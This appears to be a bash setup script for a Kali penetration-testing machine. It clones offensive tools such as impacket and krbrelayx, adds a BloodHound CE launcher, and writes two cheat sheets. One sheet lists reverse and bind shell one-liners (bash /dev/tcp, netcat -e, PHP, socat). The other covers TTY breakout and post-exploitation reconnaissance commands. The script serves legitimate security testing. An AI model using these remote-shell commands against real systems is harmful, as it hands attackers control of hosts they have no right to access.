#!/usr/bin/env bash
set -e

echo "[ InkSec Kali Setup ] Configuring ~/tools..."

TOOLS="$HOME/tools"
mkdir -p "$TOOLS"
mkdir -p "$TOOLS/bin"

cd "$TOOLS"

clone_if_missing () {
    local repo="$1"
    local target="$2"
    if [ -d "$target" ]; then
        echo "  - $target already exists, skipping"
    else
        echo "  - cloning $repo -> $target"
        git clone "$repo" "$target"
    fi
}

# -------------------------------------------------------
# Git-based tools
# -------------------------------------------------------

clone_if_missing "https://github.com/mohinparamasivam/AD-Username-Generator" "AD-Username-Generator"
clone_if_missing "https://github.com/fortra/impacket.git" "impacket"
clone_if_missing "https://github.com/ticarpi/jwt_tool" "jwt_tool"
clone_if_missing "https://github.com/dirkjanm/krbrelayx" "krbrelayx"
clone_if_missing "https://github.com/ozelis/winrmexec.git" "winrmexec"
clone_if_missing "https://github.com/markti/certreq" "certreq"

# -------------------------------------------------------
# Cheatsheet: revshells
# -------------------------------------------------------
if [ ! -f "$TOOLS/revshells" ]; then
cat > "$TOOLS/revshells" <<"EOF"
--------------------------------------------------------------
                    Bash Bind Shell
--------------------------------------------------------------
bash -c 'bash -i >& /dev/tcp/0.0.0.0/<PORT> 0>&1'


--------------------------------------------------------------
                    Bash Reverse Shell
--------------------------------------------------------------
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1


--------------------------------------------------------------
                   Netcat Reverse Shell
--------------------------------------------------------------
nc -e /bin/sh <IP> <PORT>
nc -e /bin/bash <IP> <PORT>


--------------------------------------------------------------
             Netcat (BusyBox) Reverse Shell
--------------------------------------------------------------
busybox nc <IP> <PORT> -e /bin/bash


--------------------------------------------------------------
                    PHP Reverse Shell
--------------------------------------------------------------
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'


--------------------------------------------------------------
                    Socat Reverse Shell
--------------------------------------------------------------
socat tcp-connect:<IP>:<PORT> exec:/bin/bash


--------------------------------------------------------------
              File Transfer with Python 3
--------------------------------------------------------------
python3 -m http.server <PORT>
EOF

    echo "  - Created cheatsheet: $TOOLS/revshells"
fi

# -------------------------------------------------------
# Cheatsheet: breakout
# -------------------------------------------------------
if [ ! -f "$TOOLS/breakout" ]; then
cat > "$TOOLS/breakout" <<"EOF"
-------------------------------------------------------------
                    TTY Breakout Reference
-------------------------------------------------------------

# If BASH is blocked
# Check the 'env' variable!
# Reminder: Linux defaults to /bin/bash with a default bashrc if no ~/.bashrc exists.

# Step 1: Basic shell access
ssh neo@127.0.0.1 "/bin/sh"
cd \$HOME
mv .bashrc .bashrc.BAK
exit
ssh neo@127.0.0.1

-------------------------------------------------------------
                   TTY Upgrade Techniques
-------------------------------------------------------------

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'

# Keyboard Shortcut:
# Ctrl + Z (Background Process)
stty raw -echo; fg; reset
stty columns 200 rows 200

-------------------------------------------------------------
               Post-Breakout Reconnaissance
-------------------------------------------------------------

# Find world-writable symlinks
find / -perm -2 -type l -ls 2>/dev/null | sort -r

# List users with valid shells
grep -vE "nologin|false" /etc/passwd

-------------------------------------------------------------
                    Miscellaneous Commands
-------------------------------------------------------------

chmod u+x /tmp/shell.sh
/tmp/shell.sh

-------------------------------------------------------------
EOF

    echo "  - Created cheatsheet: $TOOLS/breakout"
fi

# -------------------------------------------------------
# BloodHound CE helper script
# -------------------------------------------------------
BHCE_DIR="$TOOLS/bloodhound-ce"
mkdir -p "$BHCE_DIR"

cat > "$TOOLS/bin/bhce-up" <<"EOF"
#!/usr/bin/env bash
set -e

TOOLS="$HOME/tools"
BHCE_DIR="$TOOLS/bloodhound-ce"

mkdir -p "$BHCE_DIR"
cd "$BHCE_DIR"

if [ ! -f docker-compose.yml ]; then
    echo "[ InkSec ] Fetching BloodHound CE docker-compose.yml..."
    curl -L https://ghst.ly/getbhce -o docker-compose.yml
fi

echo "[ InkSec ] Starting BloodHound CE containers..."
docker-compose pull
docker-compose up -d

echo "[ InkSec ] BloodHound password (searching logs):"
docker-compose logs bloodhound | grep -i passw || echo "Check 'docker-compose logs bloodhound' manually."

echo "[ InkSec ] Open http://127.0.0.1:8080 in your browser (user: admin)."
EOF

chmod +x "$TOOLS/bin/bhce-up"

echo "[ InkSec Kali Setup ] ~/tools ready."
echo "  - Cheats: revshells, breakout"
echo "  - BloodHound CE helper: bhce-up"
